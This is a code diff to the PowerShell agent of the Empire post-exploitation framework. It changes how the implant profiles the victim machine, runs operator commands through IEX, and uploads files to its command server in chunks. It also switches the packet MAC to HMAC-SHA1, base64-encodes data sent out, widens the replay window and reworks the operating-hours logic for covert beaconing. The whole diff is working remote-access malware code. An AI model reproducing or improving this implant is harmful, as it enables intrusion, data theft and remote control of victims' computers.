@@ -210,7 +210,7 @@ function Invoke-Empire {
     function Get-Sysinfo {
         $str = $Servers[$ServerIndex]
         $str += '|' + [Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
-        $p = (gwmi Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
+        $p = (Get-WmiObject Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
         $str += '|' +@{$true=$p[0];$false=$p}[$p.Length -lt 6];
         $str += '|' +(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
         # if we're SYSTEM, we're high integrity
@@ -219,7 +219,7 @@ function Invoke-Empire {
         }
         else{
             # otherwise check the groups
-            $str += '|'+($(whoami /groups) -join "").Contains("High Mandatory Level");
+            $str += '|'+ ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
         }
         $n = [System.Diagnostics.Process]::GetCurrentProcess();
         $str += '|'+$n.ProcessName+'|'+$n.Id;
@@ -239,143 +239,139 @@ function Invoke-Empire {
     function Invoke-ShellCommand {
         param($cmd, $cmdargs="")
 
-        # extract the command and arguments
-        $parts = $cmd.split(" ")
-        $cmd = $parts[0]
-        if ($parts.length -ne 1){
-            $cmdargs = $parts[1..$parts.length] -join " "
-            # if this is a UNC path, forget the fancy formatting so we can get the stupid path to work
-            if ($cmdargs.contains("\\")){
-                $cmdargs = $cmdargs.trim("`"").trim("'")
-                $cmdargs = "$cmdargs"
-            }
+        # UNC path normalization for PowerShell
+        if ($cmdargs -like "*`"\\*") {
+            $cmdargs = $cmdargs -replace "`"\\","FileSystem::`"\"
+        }
+        elseif ($cmdargs -like "*\\*") {
+            $cmdargs = $cmdargs -replace "\\\\","FileSystem::\\"
         }
 
         $output = ""
-        switch ($cmd){
-            ls {
-                if ($cmdargs.length -eq ""){
-                    $output = Get-ChildItem -force | select lastwritetime,length,name
-                }
-                else {
-                    $output = Get-ChildItem -force -path $cmdargs | select lastwritetime,length,name
-                }
-            }
-            dir {
-                if ($cmdargs.length -eq ""){
-                    $output = Get-ChildItem -force | select lastwritetime,length,name
-                }
-                else {
-                    try{
-                        $output = Get-ChildItem -force -path "FileSystem::$cmdargs" -ErrorAction Stop | select lastwritetime,length,name
+        if ($cmd.ToLower() -eq "shell") {
+            # if we have a straight 'shell' command, skip the aliases
+            if ($cmdargs.length -eq ""){ $output = "no shell command supplied" }
+            else { $output = IEX "$cmdargs" }
+        }
+        else {
+            switch -regex ($cmd) {
+                '(ls|dir)' {
+                    if ($cmdargs.length -eq "") {
+                        $output = Get-ChildItem -force | select lastwritetime,length,name
                     }
-                    catch [System.Management.Automation.ActionPreferenceStopException]{
-                        $output = "[!] Error: $_ (or cannot be accessed)."
+                    else {
+                        try{
+                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop | select lastwritetime,length,name"
+                        }
+                        catch [System.Management.Automation.ActionPreferenceStopException] {
+                            $output = "[!] Error: $_ (or cannot be accessed)."
+                        }
                     }
                 }
-            }
-            rm { 
-                if ($cmdargs.length -ne ""){ 
-                    try {
-                        Remove-Item $cmdargs -ErrorAction Stop;
-                        $output = "$cmdargs deleted"
-                    } 
-                    catch {
-                        $output=$_.Exception;
-                    } 
+                '(mv|move|copy|cp|rm|del|rmdir)' {
+                    if ($cmdargs.length -ne "") { 
+                        try {
+                            IEX "$cmd $cmdargs -Force -ErrorAction Stop"
+                            $output = "executed $cmd $cmdargs"
+                        } 
+                        catch {
+                            $output=$_.Exception;
+                        }
+                    }                    
                 }
-            }
-            del { 
-                if ($cmdargs.length -ne ""){ 
-                    try {
-                        Remove-Item $cmdargs -ErrorAction Stop;
-                        $output = "$cmdargs deleted"
-                    } 
-                    catch {
-                        $output=$_.Exception;
-                    } 
+                cd { 
+                    if ($cmdargs.length -ne "")
+                    {
+                        $cmdargs = $cmdargs.trim("`"").trim("'")
+                        cd "$cmdargs"
+                        $output = pwd
+                    }
                 }
-            }
-            pwd { $output = pwd }
-            cat { if ($cmdargs.length -ne ""){ $output = cat $cmdargs }}
-            cd { 
-                if ($cmdargs.length -ne "")
-                { 
-                    cd $cmdargs
-                    $output = pwd
-                }
-            }
-            mkdir { if ($cmdargs.length -ne ""){ $output = mkdir $cmdargs }}
-            rmdir { if ($cmdargs.length -ne ""){ $output = rmdir $cmdargs }}
-            mv { if ($cmdargs.length -ne ""){ $output = mv $cmdargs }}
-            arp { $output = arp -a }
-            netstat { $output = netstat -a }
-            ipconfig { $output = ipconfig -all }
-            ifconfig { $output = ipconfig -all }
-
-            # this is stupid how complicated it is to get this information...
-            ps { 
-                if ($cmdargs.length -ne "") {
-                    $output = tasklist /V /FO CSV | ConvertFrom-Csv | Where-Object {$_."Image Name" -match $cmdargs} | Select-Object -Property 'Image Name', 'PID', 'User Name', 'Mem Usage'
-                } 
-                else {
-                    $output = tasklist /V /FO CSV | ConvertFrom-Csv | ?{$_.'Image Name' -ne "tasklist.exe"} | Select-Object -Property 'Image Name', 'PID', 'User Name', 'Mem Usage'
-                }
-                if ([System.IntPtr]::Size -eq 4){
-                    # if we're running ps on an x86 architecture
-                    $output = $output | % {
-                        $process = Get-Process -Id $_.PID
-                        $arch = "x86"
+                '(ipconfig|ifconfig)' {
+                    $output = Get-WmiObject -class "Win32_NetworkAdapterConfiguration" | ? {$_.IPEnabled -Match "True"} | % {
                         $out = New-Object psobject
-                        $out | Add-Member Noteproperty 'ProcessName' $_.'Image Name'
-                        $out | Add-Member Noteproperty 'PID' $_.PID
-                        $out | Add-Member Noteproperty 'Arch' $arch
-                        $out | Add-Member Noteproperty 'UserName' $_.'User Name'
-                        $out | Add-Member Noteproperty 'MemUsage' $_.'Mem Usage'
+                        $out | Add-Member Noteproperty 'Description' $_.Description
+                        $out | Add-Member Noteproperty 'MACAddress' $_.MACAddress
+                        $out | Add-Member Noteproperty 'DHCPEnabled' $_.DHCPEnabled
+                        $out | Add-Member Noteproperty 'IPAddress' $($_.IPAddress -join ",")
+                        $out | Add-Member Noteproperty 'IPSubnet' $($_.IPSubnet -join ",")
+                        $out | Add-Member Noteproperty 'DefaultIPGateway' $($_.DefaultIPGateway -join ",")
+                        $out | Add-Member Noteproperty 'DNSServer' $($_.DNSServerSearchOrder -join ",")
+                        $out | Add-Member Noteproperty 'DNSHostName' $_.DNSHostName
+                        $out | Add-Member Noteproperty 'DNSSuffix' $($_.DNSDomainSuffixSearchOrder -join ",")
                         $out
-                    } | ft -wrap
+                    } | fl | Out-String | %{$_ + "`n"}
                 }
-                else {
-                    # otherwise we're x64
-                    $output = $output | % {
-                        $process = Get-Process -Id $_.PID
+                # this is stupid how complicated it is to get this information...
+                '(ps|tasklist)' { 
+                    $owners = @{}
+                    Get-WmiObject win32_process | % {$o = $_.getowner(); if(-not $($o.User)){$o="N/A"} else {$o="$($o.Domain)\$($o.User)"}; $owners[$_.handle] = $o}
+                    if($cmdargs -ne "") { $p = $cmdargs }
+                    else{ $p = "*" }
+                    $output = Get-Process $p | % {
                         $arch = "x64"
-                        $modules = $process.modules
-                        foreach($module in $process.modules) {
-                            if([System.IO.Path]::GetFileName($module.FileName).ToLower() -eq "wow64.dll") {
-                                $arch = "x86"
-                                break
+                        if ([System.IntPtr]::Size -eq 4){
+                            $arch = "x86"
+                        }
+                        else{
+                            foreach($module in $_.modules) {
+                                if([System.IO.Path]::GetFileName($module.FileName).ToLower() -eq "wow64.dll") {
+                                    $arch = "x86"
+                                    break
+                                }
                             }
                         }
                         $out = New-Object psobject
-                        $out | Add-Member Noteproperty 'ProcessName' $_.'Image Name'
-                        $out | Add-Member Noteproperty 'PID' $_.PID
+                        $out | Add-Member Noteproperty 'ProcessName' $_.ProcessName
+                        $out | Add-Member Noteproperty 'PID' $_.ID
                         $out | Add-Member Noteproperty 'Arch' $arch
-                        $out | Add-Member Noteproperty 'UserName' $_.'User Name'
-                        $out | Add-Member Noteproperty 'MemUsage' $_.'Mem Usage'
+                        $out | Add-Member Noteproperty 'UserName' $owners[$_.id.tostring()]
+                        $mem = "{0:N2} MB" -f $($_.WS/1MB)
+                        $out | Add-Member Noteproperty 'MemUsage' $mem
                         $out
-                    } | ft -wrap
+                    } | Sort-Object -Property PID
+                }
+                getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() }
+                route {
+                    if (($cmdargs.length -eq "") -or ($cmdargs.lower() -eq "print")){ 
+                        # build a table of adapter interfaces indexes -> IP address for the adapater
+                        $adapters = @{}
+                        Get-WmiObject Win32_NetworkAdapterConfiguration | %{ $adapters[[int]($_.InterfaceIndex)] = $_.IPAddress }
+                        $output = Get-WmiObject win32_IP4RouteTable | %{
+                            $out = New-Object psobject
+                            $out | Add-Member Noteproperty 'Destination' $_.Destination
+                            $out | Add-Member Noteproperty 'Netmask' $_.Mask
+                            if ($_.NextHop -eq "0.0.0.0"){
+                                $out | Add-Member Noteproperty 'NextHop' "On-link"
+                            }
+                            else{
+                                $out | Add-Member Noteproperty 'NextHop' $_.NextHop
+                            }
+                            if($adapters[$_.InterfaceIndex] -and ($adapters[$_.InterfaceIndex] -ne "")){
+                                $out | Add-Member Noteproperty 'Interface' $($adapters[$_.InterfaceIndex] -join ",")
+                            }
+                            else {
+                                $out | Add-Member Noteproperty 'Interface' '127.0.0.1'
+                            }
+                            $out | Add-Member Noteproperty 'Metric' $_.Metric1
+                            $out
+                        } | ft -autosize | Out-String
+                    }
+                    else { $output = route $cmdargs }
+                }
+                '(whoami|getuid)' { $output = [Security.Principal.WindowsIdentity]::GetCurrent().Name }
+                hostname {
+                    $output = [System.Net.Dns]::GetHostByName(($env:computerName))
+                }
+                '(reboot|restart)' { Restart-Computer -force }
+                shutdown { Stop-Computer -force }
+                default {
+                    if ($cmdargs.length -eq ""){ $output = IEX $cmd }
+                    else { $output = IEX "$cmd $cmdargs" }
                 }
             }
-
-            tasklist { $output = tasklist /V /FO CSV | ConvertFrom-Csv | Select-Object -Property 'Image Name', 'PID', 'Session Name', 'User Name', 'Mem Usage' | ft -wrap}
-            getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() | ft -wrap }
-            net { if ($cmdargs.length -ne ""){ $output = net $cmdargs }}
-            route {
-                if ($cmdargs.length -eq ""){ $output = route print }
-                else { $output = route $cmdargs }
-            }
-            whoami { [Security.Principal.WindowsIdentity]::GetCurrent().Name | Out-String }
-            getuid { [Security.Principal.WindowsIdentity]::GetCurrent().Name | Out-String }
-            reboot { Restart-Computer -force }
-            restart { Restart-Computer -force }
-            shutdown { Stop-Computer -force }
-            default {
-                if ($cmdargs.length -eq ""){ $output = IEX $cmd }
-                else { $output = IEX "$cmd $cmdargs" }
-            }
         }
-        "`n"+($output | format-table -wrap | out-string)
+        "`n"+($output | Format-Table -wrap | Out-String)
     }
 
     function Start-AgentJob {
@@ -527,7 +523,8 @@ function Invoke-Empire {
         $AES.Key = $encoding.GetBytes($SessionKey);
         $AES.IV = $IV;
         $ciphertext = $IV + ($AES.CreateEncryptor()).TransformFinalBlock($bytes, 0, $bytes.Length);
-        $hmac = New-Object System.Security.Cryptography.HMACMD5;
+        # append the MAC
+        $hmac = New-Object System.Security.Cryptography.HMACSHA1;
         $hmac.Key = $encoding.GetBytes($SessionKey);
         $ciphertext + $hmac.ComputeHash($ciphertext);
     } 
@@ -536,9 +533,9 @@ function Invoke-Empire {
         param ($inBytes)
         if($inBytes.Length -gt 32){
             # Verify the MAC
-            $mac = $inBytes[-16..-1];
-            $inBytes = $inBytes[0..($inBytes.length - 17)];
-            $hmac = New-Object System.Security.Cryptography.HMACMD5;
+            $mac = $inBytes[-20..-1];
+            $inBytes = $inBytes[0..($inBytes.length - 21)];
+            $hmac = New-Object System.Security.Cryptography.HMACSHA1;
             $hmac.Key = $encoding.GetBytes($SessionKey);
             $expected = $hmac.ComputeHash($inBytes);
             if (@(Compare-Object $mac $expected -sync 0).Length -ne 0){
@@ -569,6 +566,9 @@ function Invoke-Empire {
             $data = $data -join "`n"
         }
         
+        #convert data to base64 so we can support all encodings and handle on server side
+        $data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($data))
+
         $packet = New-Object Byte[] (12 + $data.Length)
 
         # calculate the counter = epochDiff from server + current epoch
@@ -668,12 +668,45 @@ function Invoke-Empire {
             }
             # file download
             elseif($type -eq 41){
-                try{
-                    $path = Get-Childitem $data | %{$_.FullName}
-                    # read in and send 512kb chunks for as long as the file has more parts
+                try {
+                    $ChunkSize = 512KB
+                    
+                    $Parts = $Data.Split(" ")
+
+                    if($Parts.Length -gt 1) {
+                        $Path = $Parts[0..($parts.length-2)] -join " "
+                        try {
+                            $ChunkSize = $Parts[-1]/1
+                            if($Parts[-1] -notlike "*b*") {
+                                # if MB/KB not specified, assume KB and adjust accordingly
+                                $ChunkSize = $ChunkSize * 1024
+                            }
+                        }
+                        catch {
+                            # if there's an error converting the last token, assume no
+                            #   chunk size is specified and add the last token onto the path
+                            $Path += " $($Parts[-1])"
+                        }
+                    }
+                    else {
+                        $Path = $Data
+                    }
+
+                    # hardcoded floor/ceiling limits
+                    if($ChunkSize -lt 64KB) {
+                        $ChunkSize = 64KB
+                    }
+                    elseif($ChunkSize -gt 8MB) {
+                        $ChunkSize = 8MB
+                    }
+
+                    # resolve the complete path
+                    $Path = Get-Childitem $Path | %{$_.FullName}
+
+                    # read in and send the specified chunk size back for as long as the file has more parts
                     $Index = 0
                     do{
-                        $EncodedPart = Get-FilePart -File "$path" -Index $Index
+                        $EncodedPart = Get-FilePart -File "$path" -Index $Index -ChunkSize $ChunkSize
                         
                         if($EncodedPart){
                             $data = "{0}|{1}|{2}" -f $Index, $path, $EncodedPart
@@ -699,8 +732,7 @@ function Invoke-Empire {
 
                     Encode-Packet -type 40 -data "[*] File download of $path completed"
                 }
-                catch{
-                    # Write-Host "Error: $_"
+                catch {
                     Encode-Packet -type 0 -data "file does not exist or cannot be accessed"
                 }
             }
@@ -863,9 +895,10 @@ function Invoke-Empire {
         # calculate what the server's epoch should be based on the epoch diff
         #   this is just done for the first packet in a queue
         $ServerEpoch = [int][double]::Parse((Get-Date(Get-Date).ToUniversalTime()-UFormat %s)) - $script:EpochDiff
-        # if the epoch counter isn't within a +/- 10 minute range (600 seconds)
+
+        # if the epoch counter isn't within a +/- 12 hour range (43200 seconds)
         #   skip processing this packet
-        if ($counter -lt ($ServerEpoch-600) -or $counter -gt ($ServerEpoch+600)){
+        if ($counter -lt ($ServerEpoch-43200) -or $counter -gt ($ServerEpoch+43200)){
             return
         }
 
@@ -992,17 +1025,35 @@ function Invoke-Empire {
 
         if($Servers[$ServerIndex].StartsWith("http")){
 
-            # if there are working hours set, make sure we're operating within them
-            #   format is "8:00,17:00"
-            if ($script:WorkingHours){
-                $start = Get-Date ($script:WorkingHours.split(",")[0])
-                $end = Get-Date ($script:WorkingHours.split(",")[1])
+            # if there are working hours set, make sure we're operating within the given time span
+            #   format is "8:00-17:00"
+            if ($script:WorkingHours -match '^[0-9]{1,2}:[0-5][0-9]-[0-9]{1,2}:[0-5][0-9]$'){
+                
+                $current = Get-Date
+                $start = Get-Date ($script:WorkingHours.split("-")[0])
+                $end = Get-Date ($script:WorkingHours.split("-")[1])
 
-                $startCheck = (Get-Date) -ge (Get-Date $start)
-                $endCheck = (Get-Date) -le (Get-Date $end)
-                if( (-not $startCheck) -and (-not $endCheck)){
+                # correct for hours that span overnight
+                if (($end-$start).hours -lt 0) {
+                    $start = $start.AddDays(-1)
+                }
+
+                # if the current time is past the start time
+                $startCheck = $current -ge $start
+
+                # if the current time is less than the end time
+                $endCheck = $current -le $end
+
+                # if the current time falls outside the window
+                if ((-not $startCheck) -or (-not $endCheck)) {
+
                     # sleep until the operational window starts again
-                    $sleepSeconds = ($end - (Get-Date)).TotalSeconds
+                    $sleepSeconds = ($start - $current).TotalSeconds
+
+                    if($sleepSeconds -lt 0) {
+                        # correct for hours that span overnight
+                        $sleepSeconds = ($start.addDays(1) - $current).TotalSeconds
+                    }
                     Start-Sleep -s $sleepSeconds
                 }
             }
